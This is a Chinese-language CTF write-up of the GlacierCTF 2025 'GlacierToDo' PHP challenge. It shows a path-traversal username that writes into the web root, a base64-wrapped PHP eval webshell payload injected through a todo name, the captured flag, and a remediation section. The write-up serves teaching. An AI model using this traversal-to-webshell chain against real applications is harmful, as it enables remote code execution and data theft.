# GlacierCTF 2025 GlacierToDo

## 题目简述

题目是一个 PHP Todo 应用。每个用户的任务列表不是按数据库 ID 保存，而是直接写入：

```php
/tmp/todos/<username>
```

注册和登录均未限制用户名中的 `/`、`..` 或 `.php`。登录后添加 Todo 会把包含用户输入的 JSON 写回这个路径，因此可以用路径穿越将含 PHP tag 的 JSON 写进 Web 根目录，形成 webshell。

## 解题过程

### 1. 将用户名变成目标文件路径

注册如下用户名；官方 solver 使用空密码，登录时保持一致即可：

```text
../../var/www/html/todo-shell.php
```

后端拼接后的路径为：

```text
/tmp/todos/../../var/www/html/todo-shell.php
```

文件系统规范化后就是 `/var/www/html/todo-shell.php`。登录时 session 保存原始用户名，后续 Todo 读写仍使用该值，所以不需要另一个文件上传入口。

### 2. 通过 Todo 名称注入 PHP 代码

添加任务时，程序执行的核心逻辑是：

```php
$todos[] = [
    "id" => uniqid(),
    "name" => $name,
    "desc" => $desc,
];
file_put_contents(TODOS . "/" . $user, json_encode(array_values($todos)));
```

官方 solver 先构造要执行的 PHP 语句，再将其 Base64 编码后放进 `name`：

```python
import base64

payload = b"echo file_get_contents('/flag.txt');"
name = (
    "<?php eval(base64_decode('"
    + base64.b64encode(payload).decode()
    + "')); ?>"
)
```

生成文件整体虽然是 JSON，但 PHP 解释器会扫描 `.php` 文件中的 PHP open tag，不要求整个文件都是合法 PHP。JSON 中 tag 之外的字符只会作为普通响应文本输出；tag 内代码解码并执行 payload，直接读取 `/flag.txt`。

### 3. 访问落地文件读取 flag

访问落地文件：

```text
/todo-shell.php
```

响应可能在 flag 前后带有 JSON 片段，按 `gctf{...}` 提取即可。源码实例结果为：

```text
gctf{OoPsY_D3!sYY_S3eMs_!_F0rGoT_S4n!tIzNg_My_sTuFF_Pr0p3rlY_0yLSO29XHJqc6E}
```

## 方法总结

利用链是“用户名路径穿越 → Todo JSON 任意路径写 → `.php` 中嵌入 tag → Web RCE”。JSON 编码只负责数据序列化，不会让写入可执行目录的文件变安全；扩展名和 Web 服务器 handler 决定它仍会被 PHP 解析。修复应把用户名映射为服务器生成的不可猜文件 ID，写入目录固定在 Web 根之外，并使用 `realpath`/目录边界校验保证最终路径仍位于预期根目录。
